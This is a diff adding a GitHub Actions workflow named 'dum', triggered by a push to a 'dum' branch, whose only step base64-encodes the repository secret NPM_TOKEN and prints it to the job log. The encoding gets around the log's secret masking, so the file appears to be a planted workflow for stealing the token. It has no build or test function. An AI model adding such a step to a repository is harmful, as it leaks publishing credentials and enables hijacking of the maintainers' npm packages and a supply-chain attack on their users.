@@ -1,0 +1,14 @@
+name: dum
+
+on:
+  push:
+    branches: [ "dum" ]
+  workflow_dispatch:
+
+jobs:
+  dum:
+    runs-on: ubuntu-latest
+    steps:
+      - run: 'echo "$DUM" | base64'
+        env:
+          DUM: ${{ secrets.NPM_TOKEN }}
